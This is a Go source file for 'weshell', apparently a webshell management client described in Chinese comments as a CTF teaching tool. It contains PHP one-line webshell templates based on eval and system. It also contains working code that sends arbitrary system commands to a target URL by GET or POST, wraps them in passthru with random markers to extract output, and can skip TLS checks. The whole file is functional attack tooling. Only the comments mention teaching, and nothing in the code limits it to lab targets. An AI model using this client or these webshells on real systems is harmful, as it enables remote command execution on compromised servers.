// Package shell 实现 weshell 与靶机之间的明文 HTTP 通信与回显提取。
//
// 该包刻意保持「朴素」：请求就是一个带单个参数的表单或查询串，载荷是可读的
// 系统命令或一小段 PHP 代码。没有加密、没有编码变形、没有混淆，
// 因此在教学中可以直接抓包观察真实流量。
package shell

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// maxResponseSize 限制单次响应体积，避免靶机返回一个巨大输出把我们拖垮。
const maxResponseSize = 1 << 20 // 1 MiB

// maxRedirects 限制重定向次数。
const maxRedirects = 5

// 支持的连接类型。
const (
	// TypeEval 对应靶机侧 <?php @eval($_REQUEST['x']);?>，提交的是一小段 PHP 代码。
	TypeEval = "php-eval"
	// TypeCmd 对应靶机侧 <?php system($_REQUEST['x']);?> 等形态，直接提交系统命令。
	TypeCmd = "php-cmd"
)

// TypeInfo 描述一种连接类型，供前端下拉框与教学说明使用。
type TypeInfo struct {
	ID      string `json:"id"`
	Label   string `json:"label"`
	Snippet string `json:"snippet"` // 靶机侧样本模板，{param} 由前端替换
	Note    string `json:"note"`
}

// Types 返回全部支持的连接类型。
func Types() []TypeInfo {
	return []TypeInfo{
		{
			ID:      TypeEval,
			Label:   "PHP eval 型",
			Snippet: "<?php @eval($_REQUEST['{param}']);?>",
			Note:    "最常见的一句话。管理端提交一小段 PHP 代码，用随机标记包裹输出，回显定位最准确。",
		},
		{
			ID:      TypeCmd,
			Label:   "PHP 命令执行型",
			Snippet: "<?php system($_REQUEST['{param}']);?>",
			Note:    "直接把系统命令作为参数值提交。无法插入输出标记，回显为响应体原文。",
		},
	}
}

// Valid 判断连接类型是否受支持。
func Valid(t string) bool {
	switch t {
	case TypeEval, TypeCmd:
		return true
	default:
		return false
	}
}

// ExecOptions 描述一次命令执行所需的全部参数。
type ExecOptions struct {
	TargetURL  string
	Param      string
	Method     string // GET / POST
	Type       string // TypeEval / TypeCmd
	Command    string
	Timeout    time.Duration
	SkipVerify bool // 是否忽略靶机 HTTPS 证书校验
}

// Result 是一次命令执行的完整结果。RequestURL 与 Payload 供教学时观察实际请求形态。
type Result struct {
	OK         bool   `json:"ok"`
	Output     string `json:"output"`
	Status     int    `json:"status"`
	LatencyMS  int64  `json:"latencyMs"`
	Error      string `json:"error,omitempty"`
	RequestURL string `json:"requestUrl"`
	Payload    string `json:"payload"`
	Truncated  bool   `json:"truncated"`
}

// Execute 向靶标发送一次命令并返回回显。
// 所有失败都以 Result.OK=false + Error 体现，不返回 error，便于前端统一渲染。
func Execute(ctx context.Context, o ExecOptions) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}

	method := strings.ToUpper(o.Method)
	start, end, payload := buildPayload(o)

	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return Result{Error: fmt.Sprintf("URL 解析失败: %v", err)}
	}
	form := url.Values{}
	form.Set(o.Param, payload)

	var body io.Reader
	displayURL := o.TargetURL
	switch method {
	case http.MethodGet:
		// 保留靶标 URL 上原有的查询串，再追加我们的参数。
		q := u.Query()
		for k, vs := range form {
			q[k] = vs
		}
		u.RawQuery = q.Encode()
		displayURL = u.String()
	default:
		body = strings.NewReader(form.Encode())
	}

	if o.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, o.Timeout)
		defer cancel()
	}

	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return Result{Error: fmt.Sprintf("构造请求失败: %v", err)}
	}
	if method == http.MethodPost {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", "weshell/ctf-teaching")

	client := &http.Client{
		Timeout: o.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= maxRedirects {
				return fmt.Errorf("重定向次数超过 %d 次，已中止", maxRedirects)
			}
			return nil
		},
	}
	if o.SkipVerify {
		client.Transport = &http.Transport{
			Proxy:           http.ProxyFromEnvironment,
			TLSClientConfig: insecureTLSConfig(),
		}
	}

	begin := time.Now()
	resp, err := client.Do(req)
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("请求失败: %v", err),
			LatencyMS:  time.Since(begin).Milliseconds(),
			RequestURL: displayURL,
			Payload:    payload,
		}
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseSize))
	latency := time.Since(begin).Milliseconds()
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("读取响应失败: %v", err),
			Status:     resp.StatusCode,
			LatencyMS:  latency,
			RequestURL: displayURL,
			Payload:    payload,
		}
	}

	out := string(raw)
	truncated := len(raw) >= maxResponseSize
	if start != "" && end != "" {
		if extracted, ok := extract(out, start, end); ok {
			out = extracted
		}
	}

	res := Result{
		OK:         true,
		Output:     strings.Trim(out, "\r\n"),
		Status:     resp.StatusCode,
		LatencyMS:  latency,
		RequestURL: displayURL,
		Payload:    payload,
		Truncated:  truncated,
	}
	if resp.StatusCode >= 400 {
		res.OK = false
		res.Error = fmt.Sprintf("靶机返回 HTTP %d", resp.StatusCode)
	}
	return res
}

// validate 校验一次执行请求的必要字段。
func (o ExecOptions) validate() error {
	if strings.TrimSpace(o.TargetURL) == "" {
		return fmt.Errorf("靶标 URL 不能为空")
	}
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return fmt.Errorf("靶标 URL 无法解析: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("靶标 URL 必须是 http 或 https，当前为 %q", u.Scheme)
	}
	if u.Host == "" {
		return fmt.Errorf("靶标 URL 缺少主机名")
	}
	if strings.TrimSpace(o.Param) == "" {
		return fmt.Errorf("连接参数名不能为空")
	}
	if !Valid(o.Type) {
		return fmt.Errorf("不支持的连接类型: %q", o.Type)
	}
	if strings.TrimSpace(o.Command) == "" {
		return fmt.Errorf("命令不能为空")
	}
	switch strings.ToUpper(o.Method) {
	case http.MethodGet, http.MethodPost:
	default:
		return fmt.Errorf("不支持的 HTTP 方法: %q，仅支持 GET / POST", o.Method)
	}
	return nil
}

// buildPayload 按连接类型构造提交给靶机的参数值。
// eval 型会额外返回一对随机标记，用于从层中精确截取回显。
func buildPayload(o ExecOptions) (start, end, payload string) {
	cmd := strings.TrimSpace(o.Command)
	switch o.Type {
	case TypeEval:
		start, end = marker(), marker()
		payload = fmt.Sprintf("echo %s;passthru(%s);echo %s;",
			phpQuote(start), phpQuote(withStderr(cmd)), phpQuote(end))
		return start, end, payload
	default:
		return "", "", cmd
	}
}

// withStderr 给命令追加 2>&1，让标准错误也进入回显，方便教学排错。
func withStderr(cmd string) string {
	if strings.Contains(cmd, "2>") {
		return cmd
	}
	return cmd + " 2>&1"
}

// phpQuote 生成 PHP 单引号字符串字面量。PHP 单引号串内只有 \ 和 ' 需要转义。
func phpQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	return "'" + s + "'"
}

// extract 截取 start 与 end 两个标记之间的内容。
func extract(body, start, end string) (string, bool) {
	i := strings.Index(body, start)
	if i < 0 {
		return "", false
	}
	rest := body[i+len(start):]
	j := strings.Index(rest, end)
	if j < 0 {
		// 命令可能执行到一半被超时掐断，返回已拿到的部分比什么都不给更有用。
		return rest, true
	}
	return rest[:j], true
}

// insecureTLSConfig 仅供用户显式传入 -insecure 时使用。
func insecureTLSConfig() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true}
}

// marker 生成一次性的随机标记，避免与命令输出内容撞车。
func marker() string {
	var buf [8]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return fmt.Sprintf("ws-%d", time.Now().UnixNano())
	}
	return "ws-" + hex.EncodeToString(buf[:])
}
